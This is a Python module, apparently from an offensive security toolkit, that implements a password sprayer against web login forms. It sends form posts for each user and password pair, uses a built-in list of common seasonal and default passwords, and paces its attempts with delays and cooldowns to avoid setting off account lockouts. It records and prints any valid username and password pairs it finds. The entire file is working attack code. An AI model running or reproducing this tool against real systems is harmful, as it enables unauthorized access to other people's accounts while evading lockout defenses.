import json
import urllib.request
import urllib.parse
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from utils.output import section, info, success, warning, error, result, table


class CredSpray:
    description = "Advanced credential sprayer: password spraying with anti-lockout detection"

    COMMON_PASSWORDS = [
        "Password1", "Password123", "Welcome1", "Welcome123", "ChangeMe1",
        "P@ssw0rd", "P@ssword1", "Admin123", "Spring2024", "Fall2023",
        "Summer2024", "Winter2023", "Company1", "Corp123", "LetMeIn1",
        "Passw0rd!", "Welcome@123", "User@2024", "Temp1234", "TempPass1",
    ]

    @staticmethod
    def run(url="", target="", username="", usernames="", user_file="", password="", passwords="", pass_file="", delay=2, lockout_threshold=5, max_attempts=3, field_user="username", field_pass="password", fail_str="invalid", timeout=15, **kwargs):
        section("Credential Sprayer")

        target_url = url or target or ""
        if not target_url:
            error("No target URL")
            return {"error": "no target"}

        userlist = []
        if username:
            userlist.append(username)
        if usernames:
            userlist.extend(u.strip() for u in usernames.split(",") if u.strip())
        if user_file:
            try:
                with open(user_file) as f:
                    userlist.extend(line.strip() for line in f if line.strip())
            except:
                warning(f"Cannot open {user_file}")
        if user_file or usernames or username:
            pass
        else:
            info("No users provided — need at least --username, --usernames, or --user-file")
            return {"error": "no users"}

        spray_passwords = []
        if password:
            spray_passwords.append(password)
        if passwords:
            spray_passwords.extend(p.strip() for p in passwords.split(",") if p.strip())
        if pass_file:
            try:
                with open(pass_file) as f:
                    spray_passwords.extend(line.strip() for line in f if line.strip())
            except:
                warning(f"Cannot open {pass_file}")
        if not spray_passwords:
            spray_passwords = CredSpray.COMMON_PASSWORDS
            info(f"Using {len(spray_passwords)} common spray passwords")

        result_data = {
            "target": target_url,
            "users_count": len(userlist),
            "passwords_count": len(spray_passwords),
            "total_attempts": len(userlist) * len(spray_passwords),
            "found": [],
            "locked_users": [],
            "lockout_detected": False,
            "delay": delay,
        }

        section(f"Spraying {len(userlist)} users with {len(spray_passwords)} passwords")
        info(f"Strategy: 1 password attempt per user, then rotate (anti-lockout)")
        info(f"Delay between attempts: {delay}s")

        spray_passwords = spray_passwords[:max_attempts]
        info(f"Testing {len(spray_passwords)} password(s) across {len(userlist)} users")

        locked_countdown = 0

        for pwd_idx, pwd in enumerate(spray_passwords):
            if locked_countdown > 0:
                info(f"Cooling down ({locked_countdown}s) — possible lockout trigger")
                time.sleep(locked_countdown)
                locked_countdown = 0

            info(f"Round {pwd_idx + 1}/{len(spray_passwords)}: trying password '{pwd}' for all users")
            round_found = 0

            for user in userlist:
                try:
                    data = urllib.parse.urlencode({field_user: user, field_pass: pwd}).encode()
                    req = urllib.request.Request(
                        target_url,
                        data=data,
                        headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"},
                    )
                    start = time.time()
                    with urllib.request.urlopen(req, timeout=timeout) as resp:
                        elapsed = time.time() - start
                        body = resp.read().decode("utf-8", errors="replace")

                        if fail_str and fail_str.lower() not in body.lower():
                            finding = {"username": user, "password": pwd, "status": resp.status}
                            result_data["found"].append(finding)
                            success(f"VALID: {user}:{pwd}")
                            round_found += 1

                        if elapsed > timeout * 0.8:
                            locked_countdown = max(locked_countdown, 30)
                            warning(f"Slow response ({elapsed:.1f}s) — possible lockout")
                except urllib.error.HTTPError as e:
                    if e.code == 429 or e.code == 401:
                        pass
                    elif e.code == 403:
                        result_data["locked_users"].append(user)
                        result_data["lockout_detected"] = True
                        locked_countdown = max(locked_countdown, 60)
                        warning(f"Account locked: {user}")
                except:
                    pass

                time.sleep(delay)

            if round_found == 0:
                info(f"No hits with '{pwd}'")
            else:
                info(f"Found {round_found} hit(s) with '{pwd}'")

        section("Spray Complete")
        if result_data["found"]:
            success(f"Found {len(result_data['found'])} valid credentials")
            rows = [[f["username"], f["password"], str(f["status"])] for f in result_data["found"]]
            table(["Username", "Password", "Status"], rows)
        else:
            info("No valid credentials found")

        if result_data["lockout_detected"]:
            warning(f"ACCOUNT LOCKOUT DETECTED: {len(result_data['locked_users'])} user(s) locked")
        else:
            success("No account lockouts triggered")

        return result_data
